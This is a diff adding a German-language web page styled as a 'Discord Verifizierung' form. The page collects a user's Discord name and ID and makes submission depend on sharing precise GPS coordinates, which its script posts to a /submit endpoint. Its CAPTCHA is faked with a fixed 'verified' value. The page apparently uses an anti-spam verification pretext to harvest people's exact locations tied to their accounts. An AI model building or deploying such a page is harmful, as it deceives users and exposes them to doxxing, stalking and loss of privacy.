@@ -1,0 +1,310 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verifizierung</title>
+    <style>
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 50px;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+            max-width: 550px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        h1 {
+            color: #1e3c72;
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 2.2em;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #2c3e50;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e8ecf0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #1e3c72;
+            box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
+            transform: translateY(-2px);
+        }
+        .location-btn {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            margin-bottom: 25px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(30, 60, 114, 0.3);
+        }
+        .location-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(30, 60, 114, 0.4);
+        }
+        .location-btn:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            color: white;
+            border: none;
+            padding: 18px 24px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
+        }
+        .submit-btn:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .privacy-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .privacy-link a {
+            color: #5865F2;
+            text-decoration: none;
+        }
+        .privacy-link a:hover {
+            text-decoration: underline;
+        }
+        .info-box {
+            background: linear-gradient(135deg, #e3f2fd 0%, #f1f8e9 100%);
+            border-left: 4px solid #1e3c72;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 0 12px 12px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Discord Verifizierung</h1>
+        
+        <div class="info-box">
+            <strong>Warum wird eine Verifizierung benötigt?</strong><br>
+            Um Spam und Missbrauch zu verhindern, müssen alle neuen Mitglieder verifiziert werden.
+        </div>
+
+        <form id="verifyForm">
+            <div class="form-group">
+                <label for="discordUsername">Discord Benutzername:</label>
+                <input type="text" id="discordUsername" name="discordUsername" required 
+                       placeholder="z.B. BenutzerName#1234">
+            </div>
+
+            <div class="form-group">
+                <label for="userId">Discord Benutzer-ID:</label>
+                <input type="text" id="userId" name="userId" required 
+                       placeholder="z.B. 123456789012345678">
+            </div>
+
+            <button type="button" id="locationBtn" class="location-btn">
+                📍 Standort für Verifizierung freigeben
+            </button>
+
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>
+                ✅ Verifizierung abschließen
+            </button>
+        </form>
+
+        <div id="status"></div>
+
+        <div class="privacy-link">
+            <a href="/privacy.html" target="_blank">Datenschutzrichtlinie</a>
+        </div>
+    </div>
+
+    <script>
+        let latitude = null;
+        let longitude = null;
+
+        document.getElementById('locationBtn').addEventListener('click', function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = '🔄 Standort wird abgerufen...';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        btn.textContent = '✅ Standort erfolgreich erfasst';
+                        btn.style.background = '#57F287';
+                        document.getElementById('submitBtn').disabled = false;
+                    },
+                    function(error) {
+                        let errorMsg = 'Fehler beim Abrufen des Standorts';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'Standortzugriff wurde verweigert';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'Standort nicht verfügbar';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'Zeitüberschreitung beim Standortabruf';
+                                break;
+                        }
+                        btn.textContent = '❌ ' + errorMsg;
+                        btn.style.background = '#ED4245';
+                        btn.disabled = false;
+                    }
+                );
+            } else {
+                btn.textContent = '❌ Geolokation wird nicht unterstützt';
+                btn.style.background = '#ED4245';
+                btn.disabled = false;
+            }
+        });
+
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const discordUsername = document.getElementById('discordUsername').value;
+            const userId = document.getElementById('userId').value;
+            
+            if (!discordUsername || !userId || !latitude || !longitude) {
+                showStatus('Bitte füllen Sie alle Felder aus und geben Sie Ihren Standort frei.', 'error');
+                return;
+            }
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = '🔄 Wird verarbeitet...';
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    discordUsername: discordUsername,
+                    userId: userId,
+                    latitude: latitude,
+                    longitude: longitude,
+                    recaptcha: 'verified' // Einfache CAPTCHA-Simulation
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showStatus('✅ Verifizierung erfolgreich! Sie sollten nun Zugang zum Server haben.', 'success');
+                    document.getElementById('verifyForm').reset();
+                    document.getElementById('locationBtn').textContent = '📍 Standort für Verifizierung freigeben';
+                    document.getElementById('locationBtn').style.background = '#5865F2';
+                    document.getElementById('locationBtn').disabled = false;
+                } else {
+                    showStatus('❌ Fehler bei der Verifizierung: ' + (data.error || 'Unbekannter Fehler'), 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showStatus('❌ Netzwerkfehler. Bitte versuchen Sie es erneut.', 'error');
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.textContent = '✅ Verifizierung abschließen';
+            });
+        });
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = 'status ' + type;
+        }
+    </script>
+</body>
+</html>
